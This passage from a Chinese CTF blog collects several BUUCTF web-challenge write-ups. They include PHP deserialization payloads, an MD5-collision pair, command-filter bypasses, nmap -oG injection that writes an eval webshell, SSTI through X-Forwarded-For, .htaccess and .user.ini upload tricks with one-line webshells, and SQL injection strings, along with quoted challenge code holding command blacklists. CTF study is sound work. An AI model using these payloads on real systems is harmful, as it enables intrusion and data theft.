我们看到这个date应该是个函数名，返回给我们时间然后p的值是date()函数的参数，因此这个可能利用了call_user_func()函数：call_user_func(函数名，参数)：调用传递函数，并返回函数运行的结果（本题中即为执行$func($p)） 那么我们就以试试用file_get_contents()函数读取文件，试试能不能直接读取flag文件，一般flag都在根目录下尝试 没找到，试了几次路径也不行，看来心急了，读取index.php试试： 123456789101112131415161718192021222324252627282930313233 &lt;?php&#x2F;&#x2F;定义段代码 $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result &#x3D; call_user_func($func, $p); $a&#x3D; gettype($result); if ($a &#x3D;&#x3D; &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p &#x3D; &quot;Y-m-d h:i:s a&quot;; var $func &#x3D; &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func !&#x3D; &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; &#x2F;&#x2F;执行代码段 $func &#x3D; $_REQUEST[&quot;func&quot;]; $p &#x3D; $_REQUEST[&quot;p&quot;]; if ($func !&#x3D; null) &#123; $func &#x3D; strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 二.代码审计我们看到它设立了一个黑名单，禁了很多命令；定义了gettime()函数——调用call_user_func()函数，并返回字符串内容；定义了Text类；同时上传两个参数，if语句判断上传的 $func中是否存在黑名单中的命令，不存在则输出调用gettime()函数。 三.思路构建我们看到它定义了一个类，但是它本身并没有利用这个类，那我们可以尝试构造一个序列化字符串，绕过$func的黑名单检测。 payload：$func=unserialize,$p=序列化字符串 那么我们怎么利用这个反序列化呢？我们看到它反序列化的过程会根据我们序列化字符串的赋值来执行。也就是说可以通过反序列化对$func和$p再赋值。这样我们就可以绕开黑名单的限制了。 sp：常用命令小结 12345system(&#39;ls&#39;) : 列举当前目录下的所有文件system(&quot;find &#x2F; -name flag*&quot;)：查找所有文件名匹配flag的文件system(&quot;cat $(find &#x2F; -name flag*)&quot;)：打印所有文件名匹配flag的文件 构造序列化字符串： 因此我们最后的payload就是：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf12","date":"2021-07-22T03:01:28.000Z","path":"2021/07/22/buuctf12/","text":"[安洵杯 2019]easy_web打开容器 一.前期探索注意到一串像base64编码的字符串，对其解码： 123base64解码：MzUzNTM1MmU3MDZlNjc=base64解码：3535352e706e67hex解码：555.png 也就是说它对555.png先后进行了一次hex编码和两次base64编码，但是我们好像的解码得到了图片名也不能做什么，再看看源码： 很长一串base64编码串，对其解码 感觉应该就是我们上传的555.png这个图片的内容，尝试对index.php进行一次hex编码和两次base64编码：TmprMlJUWTBOalUzT0RKRk56QTJPRGN3，然后传参，看看能不能返回index.php文件的内容。 对回显的字符串base64解码，得： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; 二.代码审计首先我们看到他对我们上传的参数img进行解码，并将其赋值给$file，然后用file_get_contents()函数去包含这个文件。那么我们就会想，能不能把flag.php按照他的要求编码后，通过msg上传呢？很明显我们无法通过这样做来得到flag，因为他对$file的值进行了两个正则匹配，做了严格过滤，因此我们这边是没办法绕过。我们接着往下审计，可以看到他对$cmd也做了很多过滤。然后这边要我们POST两个参数，当满足if语句参数a的值等参数b的值，且md5()编码后参数a、b的值不同时，会将我们传参的cmd的值当作代码执行完输出。 三.思路构建因此我们的思路就是先构造满足if语句的两个参数，然后通过命令执行我们的代码。 那么我们怎么满足if语句呢？一开始我想的是用数组绕过，但是这里前半段判断语句用string强行转型了 也就是说用数组无法绕过if语句前半部分的判断，因此我们要利用MD5碰撞，构造两个不同，但MD5编码相同的字符串 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 然后我们要怎么获取flag呢？ 法一：在linux系统中，ca\\t、c\\at都会被解析为cat，那么这里我们就可以利用ca\\t flag来获取flag，但是这里有个疑惑，正则匹配不是有\\\\\\\\、\\\\、\\t，但是这里是可以绕过的，原因是\\a \\t会被看做是一个整体，所以可以绕过反斜杠；这里之所以没有正则匹配\\t是因为正则匹配中的是匹配一个水平制表符（\\t），若要想拦截字符串\\t 就要添加\\\\t正则匹配。 法二：linux系统中有一个命令sort：将文件的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码进行比较，最后将它们按升序输出（就是按行排序）。 payload：sort /flag","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf11","date":"2021-07-21T00:40:37.000Z","path":"2021/07/21/buuctf11/","text":"[RoarCTF 2019]Easy Java打开容器，发现是登入页面 结合题目，这题肯定不是SQL注入了，点击help 可以看到有文件包含，但是没有包含的文件没有起作用，尝试吧GET请求改为POST 但是help.docx这个文件里没有什么线索，然后我尝试用php://filter文件读取流读取index.php、flag.php都没有成功 然后我就有点不知所措了，查看了一下wp学习了关于java的相关基础知识 一.预备知识（1） （2） （3）由于客户端是通过URL地址访问Web服务器中的资源，所以Servlet程序若想被外界访问，必须把Servlet程序映射到一个URL地址上，这个工作在web.xml文件中使用&lt;servlet&gt;元素和&lt;servlet-mapping&gt;元素完成。&lt;servlet&gt;元素用于注册Servlet，它包含有两个主要的子元素：&lt;servlet-name&gt;和&lt;servlet-class&gt;，分别用于设置Servlet的注册名称和Servlet的完整类名。一个&lt;servlet-mapping&gt;元素用于映射一个已注册的Servlet的一个对外访问路径，它包含有两个子元素：&lt;servlet-name&gt;和&lt;url-pattern&gt;，分别用于指定Servlet的注册名称和Servlet的对外访问路径。例如： 12345678&lt;servlet&gt; &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;cn.itcast.ServletDemo1&lt;&#x2F;servlet-class&gt;&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;ServletDemo1&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; 二.尝试解题先访问WEB-INF/web.xml，获取class文件路径 我们看到有我们想要的flag文件，构造路径 payload:WEB-INF/classes/com/wm/ctf/FlagController.class 可以看到回显有一串base64编码，解码得flag： [GXYCTF2019]禁止套娃打开容器，就一句话 一.前期探索查看源码，什么也没有；抓包也没有线索；用dirsearch跑buu会崩；最后用GitHack发现存在git源码泄露 打开index.php： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 代码审计： 1.第一个正则匹配：他禁用了几种的伪协议，也就是说限制我们使用伪协议去读取后台文件； 2.第二个正则匹配：(?R)是引用当前表达式,而(?R)?可以引用也可以不引用了，引用一次正则则变成了[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),可以迭代下去，那么它所匹配的就是a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子； 3.第三个正则匹配：过滤了et|na|info|dec|bin|hex|oct|pi|log这几种词根 二.思路构建我们先看一下服务器中该目录下存在哪些文件，往常来说用指令scandir(&#39;.&#39;)就行，但是这里由于第二个正则匹配不能传参。那要怎么去获取这个.呢？ 这里先介绍两个函数： 1.localeconv()函数：返回一包含本地数字及货币格式信息的数组。 2.current()：返回数组中的当前单元, 默认取第一个值。 知道了这两个函数我们就可以构造payload：?exp=print_r(scandir(current(localeconv())))； 可以看到存在flag.php，那我们要尝试去读取它 再介绍几个函数： array_reverse() 以相反的元素顺序返回数组 array_flip() 交换数组的键和值 array_rand() 从数组中随机取出一个或多个单元(返回的是键名)，不断刷新访问就会不断随机返回 next() 把指向当前元素的指针移动到下一个元素的位置，并返回当前元素的值。 因此我们这里有两种方法可以读取flag.php文件，由于get_file_contents被禁了（含et），我们可以用readfile、show_source、highlight_file读取文件 payload1：?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); payload2：?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));这种方法由于采用了array_rand，文件读取具有随机性，因此要多试几次出flag 参考资料：无参数RCE： https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE https://www.freesion.com/article/1919383150/","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf10","date":"2021-07-20T00:35:40.000Z","path":"2021/07/20/buuctf10/","text":"[BUUCTF 2018]Online Tool打开容器，发现是一段代码： 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 一.预备知识 escapeshellarg ——把字符串转码为可以在 shell 命令里使用的参数 功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号) escapeshellcmd —— shell 元字符转义 功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入：&amp;#;|?~&lt;&gt;^()[]{}$*, \\x0A 和 \\xFF。 &#39; 和 &quot;仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 举个例子 传入参数：127.0.0.1&#39; -d a=1 经过escapeshellarg()函数处理后变成：&#39;127.0.0.1&#39;\\&#39;&#39; -d a=1&#39; 再经过escapeshellcmd()函数处理后变成：&#39;127.0.0.1&#39;\\\\&#39;&#39; -d a=1\\&#39; 每对单引号配对形成连接符，最终得简化为：127.0.0.1\\ -d a=1&#39;，即向127.0.0.1\\发起请求，POST 数据为a=1’。 nmap命令-oG：将一个命令和结果写入到自己指定的文件中 二.构造payload第一种：文件名和单引号之间有空格 payload：&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39; 经过两个过滤函数处理后：&#39;\\\\&#39;&#39;\\&lt;\\?php @eval\\(\\$_POST\\[&quot;hack&quot;\\]\\)\\;\\?\\&gt; -oG webshell.php &#39;\\\\&#39;&#39; 这样我们后台生成的文件名就是webshell.php 箭头指就是上传生成文件的文件夹的名称，用蚁剑直接连接我们的木马。 第二种：文件名和单引号之间没有空格 payload：&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php&#39; 经过两个过滤函数处理后：&#39;\\\\&#39;&#39;\\&lt;\\?php @eval\\(\\$_POST\\[&quot;hack&quot;\\]\\)\\;\\?\\&gt; -oG webshell.php&#39;\\\\&#39;&#39; 这样后台生成的文件名就是webshell.php\\\\，就不能用蚁剑连接了 [BJDCTF2020]The mystery of ip打开容器，发现是一个”很干净“的网页 一.探索点击Flag进入页面： 是我们的ip地址 查看网页源码，没什么有用信息，看下一个网页 点击hint： 查看源码： 这个时候我们就想了他怎么知道我们的ip的，XFF吗还是client-ip，我们可不可以控制ip的值呢？ 二.牛刀小试带着上面的疑惑，抓包，但是我发现原本并没有XFF或是client-ip，那我们加一个XFF 我们可以看到他把我们的输入直接输出到了网页上。这里我们联想到SSTI中也是服务端把用户输入的内容渲染成模板，那么我们试一下是否存在SSTI注入 可以看到服务器执行了我们的逻辑运算，SSTI石锤了 三.构造payloadpayload：X-Forwarded-For: {system(‘ls’)} payload：X-Forwarded-For: {system(‘cat flag.php’)} 发现flag不在这里面，那按照经验来说一般会放在根目录","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf9","date":"2021-07-19T00:23:46.000Z","path":"2021/07/19/buuctf9/","text":"[MRCTF2020]你传你🐎呢打开容器，是一道文件上传题 一.牛刀小试先上传一个普通一句话木马webshell.jpg： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; ，然后抓包修改后缀为php，发现上传失败 然后我尝试了phtml、php3等都不能绕过 试着直接上传webshell.jpg 看到它有回显给我们路径，尝试一下上传.user.ini，但是由于无法确定上传的文件夹内是否已经存在php后缀文件，我猜测存在index.php，但是很可惜失败了 二.另辟蹊径这时候就要复习一个配置文件**.htaccess** .htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 我们这里上传一个**.htaccess**内容为： 12345&lt;FilesMatch &quot;webshell.jpg&quot;&gt; &#x2F;&#x2F;这里的文件名要和上传的一句话木马的文件名一样 SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 这样Apache会将我们指定的文件（webshell.jpg）以php格式解析 这边还有一点要注意的是： 上传.htaccess的时候要抓包修改修改文件类型： 最后我们用蚁剑连接就好了 [网鼎杯 2020 青龙组]AreUSerialz打开容器，发现一段代码 一.代码分段我把这段代码大致分成三部分： 第一部分交代了该文件下文件包含了flag.php文件 123&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__); 第二部分交代了FileHandler类的内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125; 第三部分交代传参的限制 123456789101112131415function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 二.代码审计通过get的方式获取一串字符串，然后判断字符串的每个字符的ascii码都在32到125之间，确保变量str的值没有不可打印的字符串后，再把str反序列化。反序列化过程中，先执行解析函数__destruct()，如果op强等于字符串2，那么op就会被赋值为字符串1，接着调用process()函数，如果op弱等于1，就调用write()函数；如果op弱等于2，就调用read()函数。值的注意的是read()函数中存在file_get_contents()函数，因此我们要想办法调用到read()函数。 三.解题思路现在我们的目标很明确了，就是要想办法调用到read()函数。那么我们要避免op在__destruct()函数中被赋值为1。 由于弱等于只判断值是否相等，而强等于不仅判断值是否相等，还先判断类型是否相等。我们注意到这里__destruct()函数中是op强等于字符串2，那我们只要让op等于数字2就可以绕过强等于的限制了。 最后我们再用php://filter文件读取流配合file_get_contents()函数就可以获取到flag啦。 四.构造序列化payload123456789101112131415&lt;?phpclass FileHandler &#123; public $op &#x3D; 2; public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;; public $content;&#125;$a &#x3D; new FileHandler();$b &#x3D; serialize($a);echo $b;?&gt; 代码执行输出b=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; payload:http://cb84aa4b-0ded-48ad-b2e7-b1cc59cdfdb3.node4.buuoj.cn/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; base64解码得flag","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf8","date":"2021-07-17T06:11:11.000Z","path":"2021/07/17/buuctf8/","text":"[网鼎杯 2018]Fakebook打开容器","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf7","date":"2021-07-15T10:19:24.000Z","path":"2021/07/15/buuctf7/","text":"[极客大挑战 2019]HardSQL打开容器，发现这是一道sql注入题而且是之前的一道续题 一.发现注入点：经过测试发现它存在注入点：&#39;，而且注入的位置是在密码栏 二.探索注入方式：进过初步的测试我发现过滤了很多关键词，包括：空格，union，and(&amp;)，or(|)等等 但是我这里发现它没有过滤**异或符(^)**，所以我们可以利用异或符做连接符，然后我们这边可以用括号代替空格（注意这里的替代不是完全替代的意思，我是怎么理解的：用括号把名词组括起来以代替空格，因此这题堆叠注入肯定用不了了，因为show和databases之间要用空格隔开。）所以思来想去可以用报错注入，这样也无需考虑异或判断语句成立的条件。 三.报错注入开始：1.爆库11&#39;^extractvalue(1,concat(0x7e,database()))# 2.爆表11&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))# 3.爆列11&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))# 4.爆值这边由于报错长度受限，我们可以猜测一下flag应该是在password里，节省一下回显长度 11&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))# 可以看到还差一点，我们可以试试用left()和right()去截 11&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))# 最后把flag拼接一下得：flag{0b94076f-db77-46e6-9ea3-34468bd544a0} [GXYCTF2019]BabySQli原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！打开容器，发现是一道sql注入题，按照惯例先看源码 一.发现hint文件发现有一个search.php的文件： 刚开始我还以为这是base64，结果解码完是乱码，搜索发现原来是base32。 注意base32 和 base64 的区别：base32 只有大写字母和数字组成，或者后面有三个等号。base64 只有大、小写字母和数字组成，后面一般是两个等号。 那么我们把这段话解码： 得到一串base64编码串，再解码： 发现就是一句普通的sql语句，注入点为&#39; 二.尝试注入先试试最常用的union联合注入 username=0&#39; union select 1,2# password=12 字段数不一致，username改成0&#39; union select 1,2,3# 那么说明user表存在三个列，按照之前的经验就是：id，username，password 然后我想直接爆库：0&#39; union select 1,2,databases#但是这样会报错，我改成0&#39; union select 1,2,database()#发现它过滤了括号，然后我尝试了报错注入，堆叠注入都不行，然后我就有点懵了，看了wp才发现自己忘记了union联合注入的一个特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据作为单独一行数据值 举例说明：假设原本user表中只存在一行数据 我们输入查询语句：0&#39; union select 1,&#39;admin&#39;,md5(123)# 后可以看到user表中多了一行 这样一来我们就混淆了admin账号的密码。 这里还有一点要注意的数据库会先检测我们的username是否存在，然后判断你输入的密码的md5编码和对应用户名的password是否一样。 因此我们要找一个存在的用户名。 一般来说数据库中都会有admin这个账号，那我们就来测试一下是否存在：0&#39; union select &#39;admin&#39;,2,3# 说明要么不在这一列，要么不存在，换一列试试：0&#39; union select 1,&#39;admin&#39;,3# 可以看到账号admin是存在的。那么下面我们就可以正式开始我们的联合注入了 三.开始注入：构造payload: username=0’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’# password=123 注：202cb962ac59075b964b07152d234b70是123的MD5编码 总结这两道都是SQL注入的题，做下来感觉就是这种题找对注入的姿势很重要","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf6","date":"2021-07-14T09:38:53.000Z","path":"2021/07/14/buuctf6/","text":"[SUCTF 2019]CheckIn打开容器，发现是一道文件上传的题，那么根据我们的金典配方，第一步就是上传后缀为gif的木马webshell.gif： 1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 然后抓包改为php， 无效后缀，说明服务器端也检测了文件后缀，然后我接着试了phtml，php3等变形后缀都不能绕过，而且他这里都不能上传的原因都是后缀不合法，我就有点难受了，看了wp发现之前upload-lab刷的关于.user.ini的内容都忘光了。 .user.iniphp.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 实际上，除了PHP_INI_SYSTEM和PHP_INI_ALL以外的模式都是可以通过.user.ini来设置的。 下面这段话是关于PHP识别ini文件的规则：PHP 除了扫描主 php.ini 之外，还会在每个目录下扫描 ini 文件，从被执行的 php 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 php 文件在 web 根目录之外，则只扫描该目录。 我们这样理解这段话：当被执行的 php 文件在 web 根目录之外时，PHP先只会扫描 被执行php文件所在的目录下是否存在ini文件，如果存在的话 就会按照这个user.ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。配置文件的利用：php.ini中的配置项中很多敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。都是我们还是找到两个可以用来利用的配置项（下图的一和四） auto_prepend_file：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。 auto_append_file：与auto_prepend_file配置项功能类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1auto_prepend_file&#x3D;webshell.gif 因此懂得了.user.ini的利用，这题的思路就打开了，但是要注意的是利用的前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。因此我们先验证一下我们上传的文件夹内是否存在php文件，然后我上传了很多个文件 发现上传的文件夹中存在index.php，那么我们就可以放心的利用啦 我们先上传一个我们的.user.ini ，但是他这里存在文件头内容检查，因此我们加上gif文件头修饰： 12GIF89aauto_prepend_file&#x3D;webshell.gif 上传成功 接着上传我们的一句话木马webshell.gif： 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 发现它过滤了&lt;?，因此再对我们的一句话木马改写webshell2.gif： 12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt; 上传成功 这边有一点要注意的是我把修改后的木马改名为了webshell2.gif，所以.user.ini内对应的文件名也要进行改写 全部上传成功以后，有两种方法可以获取flag。 第一种用蚁剑连接，再打开虚拟终端，输入指令cat /flag sp：这边还有一点需要注意，服务器会定期删除上传的文件以确保服务器安全，所以我们要尽快连接蚁剑，完成操作。 第二种就是直接传参，post我们写的一句话木马对应的变量，扫描根目录并以数组方式回显输出文件名 我们看到存在flag文件，尝试读取它： 参考资料：https://www.php.net/manual/zh/ini.list.php https://blog.csdn.net/weixin_44077544/article/details/102688564 https://blog.csdn.net/RABCDXB/article/details/113623796","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"攻防世界web进阶","date":"2021-07-13T02:46:25.000Z","path":"2021/07/13/攻防世界web进阶3/","text":"[ZJCTF 2019]NiZhuanSiWei打开容器，发现一段代码: 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 我们可以看到我们上传三个参数，先看看他的判断语句：判断是否存在text变量，并以只读方式打开文件判断文件内容是否为welcome to the 